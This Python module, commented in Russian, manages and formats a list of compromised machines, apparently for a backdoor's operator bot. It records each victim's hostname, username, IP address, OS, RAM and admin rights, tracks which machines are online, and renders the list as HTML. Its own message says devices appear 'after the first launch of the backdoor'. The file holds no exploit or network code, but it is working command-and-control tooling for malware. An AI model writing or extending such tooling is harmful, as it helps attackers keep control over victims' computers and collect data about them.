import os
import json
import logging
from datetime import datetime
from typing import Dict, List, Any

from config import DEVICES_LIST_FILE, DEVICE_STATUS_TIMEOUT
from utils import get_or_create_instance_id, get_or_create_instance_name

# Функция для работы со списком устройств
def get_devices_list() -> List[Dict[str, Any]]:
    """Получает список всех устройств из файла.
    
    Returns:
        List[Dict[str, Any]]: Список устройств
    """
    try:
        if os.path.exists(DEVICES_LIST_FILE):
            with open(DEVICES_LIST_FILE, 'r', encoding='utf-8') as f:
                devices = json.load(f)
                return devices
        return []
    except Exception as e:
        logging.error(f"Ошибка при чтении списка устройств: {e}")
        return []

def save_devices_list(devices: List[Dict[str, Any]]) -> bool:
    """Сохраняет список устройств в файл.
    
    Args:
        devices (List[Dict[str, Any]]): Список устройств для сохранения
        
    Returns:
        bool: True если сохранение успешно, иначе False
    """
    try:
        with open(DEVICES_LIST_FILE, 'w', encoding='utf-8') as f:
            json.dump(devices, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logging.error(f"Ошибка при сохранении списка устройств: {e}")
        return False

def add_device_to_list(instance_id: str, instance_name: str, system_info: Dict[str, Any]) -> bool:
    """Добавляет или обновляет устройство в списке.
    
    Args:
        instance_id (str): ID экземпляра
        instance_name (str): Имя экземпляра
        system_info (Dict[str, Any]): Информация о системе
        
    Returns:
        bool: True если операция успешна, иначе False
    """
    try:
        devices = get_devices_list()
        
        # Ищем существующее устройство
        device_index = None
        for i, device in enumerate(devices):
            if device.get("instance_id") == instance_id:
                device_index = i
                break
        
        # Создаем или обновляем информацию об устройстве
        device_info = {
            "instance_id": instance_id,
            "instance_name": instance_name,
            "hostname": system_info.get("hostname", "Unknown"),
            "username": system_info.get("username", "Unknown"),
            "ip": system_info.get("ip", "Unknown"),
            "os": system_info.get("os", "Unknown"),
            "os_version": system_info.get("os_version", "Unknown"),
            "ram": system_info.get("ram", "Unknown"),
            "admin": system_info.get("admin", False),
            "last_seen": datetime.now().isoformat(),
            "status": "online"
        }
        
        if device_index is not None:
            # Обновляем существующее устройство
            devices[device_index] = device_info
            logging.info(f"Обновлено устройство: {instance_name}")
        else:
            # Добавляем новое устройство
            devices.append(device_info)
            logging.info(f"Добавлено новое устройство: {instance_name}")
        
        # Сохраняем обновленный список
        return save_devices_list(devices)
        
    except Exception as e:
        logging.error(f"Ошибка при добавлении устройства в список: {e}")
        return False

def update_device_status(instance_id: str, status: str = "online") -> bool:
    """Обновляет статус устройства.
    
    Args:
        instance_id (str): ID экземпляра
        status (str): Новый статус
        
    Returns:
        bool: True если обновление успешно, иначе False
    """
    try:
        devices = get_devices_list()
        
        for device in devices:
            if device.get("instance_id") == instance_id:
                device["status"] = status
                device["last_seen"] = datetime.now().isoformat()
                break
        
        return save_devices_list(devices)
        
    except Exception as e:
        logging.error(f"Ошибка при обновлении статуса устройства: {e}")
        return False

def cleanup_offline_devices() -> int:
    """Очищает список от устройств, которые не были активны более 30 минут.
    
    Returns:
        int: Количество удаленных устройств
    """
    try:
        devices = get_devices_list()
        current_time = datetime.now()
        removed_count = 0
        
        # Фильтруем активные устройства
        active_devices = []
        for device in devices:
            try:
                last_seen = datetime.fromisoformat(device.get("last_seen", ""))
                time_diff = (current_time - last_seen).total_seconds()
                
                if time_diff < DEVICE_STATUS_TIMEOUT:
                    # Устройство активно
                    if device.get("status") == "online":
                        active_devices.append(device)
                    else:
                        # Обновляем статус на online
                        device["status"] = "online"
                        active_devices.append(device)
                else:
                    # Устройство неактивно
                    removed_count += 1
                    logging.info(f"Удалено неактивное устройство: {device.get('instance_name')}")
            except Exception:
                # Если не удалось разобрать время, оставляем устройство
                active_devices.append(device)
        
        # Сохраняем очищенный список
        if save_devices_list(active_devices):
            return removed_count
        return 0
        
    except Exception as e:
        logging.error(f"Ошибка при очистке неактивных устройств: {e}")
        return 0

def format_devices_list(devices: List[Dict[str, Any]]) -> str:
    """Форматирует список устройств в красивом HTML виде.
    
    Args:
        devices (List[Dict[str, Any]]): Список устройств
        
    Returns:
        str: Отформатированная HTML строка
    """
    try:
        if not devices:
            return "📱 <b>СПИСОК УСТРОЙСТВ</b>\n\n❌ <b>Устройства не найдены</b>\n\n💡 <b>Подсказка:</b> Устройства появятся после первого запуска бэкдора"
        
        # Сортируем устройства по времени последней активности
        sorted_devices = sorted(devices, key=lambda x: x.get("last_seen", ""), reverse=True)
        
        html = f"📱 <b>СПИСОК УСТРОЙСТВ</b> <code>({len(devices)} шт.)</code>\n\n"
        
        for i, device in enumerate(sorted_devices):
            # Определяем статус и эмодзи
            status = device.get("status", "unknown")
            if status == "online":
                status_emoji = "🟢"
                status_text = "Онлайн"
            else:
                status_emoji = "🔴"
                status_text = "Оффлайн"
            
            # Форматируем время последней активности
            try:
                last_seen = datetime.fromisoformat(device.get("last_seen", ""))
                time_ago = datetime.now() - last_seen
                if time_ago.total_seconds() < 60:
                    time_text = "только что"
                elif time_ago.total_seconds() < 3600:
                    minutes = int(time_ago.total_seconds() // 60)
                    time_text = f"{minutes} мин. назад"
                else:
                    hours = int(time_ago.total_seconds() // 3600)
                    time_text = f"{hours} ч. назад"
            except:
                time_text = "неизвестно"
            
            # Форматируем права администратора
            admin_text = "✅ Админ" if device.get("admin", False) else "❌ Обычный"
            
            # Получаем значения для форматирования
            instance_name = device.get('instance_name', 'Unknown')
            instance_id = device.get('instance_id', 'N/A')
            hostname = device.get('hostname', 'N/A')
            username = device.get('username', 'N/A')
            ip = device.get('ip', 'N/A')
            os_name = device.get('os', 'N/A')
            os_version = device.get('os_version', '')
            ram = device.get('ram', 'N/A')
            
            html += f"{status_emoji} <b>{instance_name}</b>\n"
            html += f"├─ <b>ID:</b> <code>{instance_id}</code>\n"
            html += f"├─ <b>Компьютер:</b> <code>{hostname}</code>\n"
            html += f"├─ <b>Пользователь:</b> <code>{username}</code>\n"
            html += f"├─ <b>IP:</b> <code>{ip}</code>\n"
            html += f"├─ <b>ОС:</b> {os_name} {os_version}\n"
            html += f"├─ <b>RAM:</b> {ram}\n"
            html += f"├─ <b>Права:</b> {admin_text}\n"
            html += f"├─ <b>Статус:</b> {status_emoji} {status_text}\n"
            html += f"└─ <b>Активность:</b> {time_text}\n"
            
            if i < len(sorted_devices) - 1:
                html += "\n"
        
        # Добавляем статистику
        online_count = sum(1 for d in devices if d.get("status") == "online")
        offline_count = len(devices) - online_count
        
        html += f"\n📊 <b>СТАТИСТИКА:</b>\n"
        html += f"🟢 <b>Онлайн:</b> {online_count}\n"
        html += f"🔴 <b>Оффлайн:</b> {offline_count}\n"
        html += f"⏰ <b>Таймаут:</b> {DEVICE_STATUS_TIMEOUT // 60} мин."
        
        return html
        
    except Exception as e:
        logging.error(f"Ошибка при форматировании списка устройств: {e}")
        return f"❌ <b>Ошибка при форматировании списка:</b>\n<code>{str(e)}</code>"

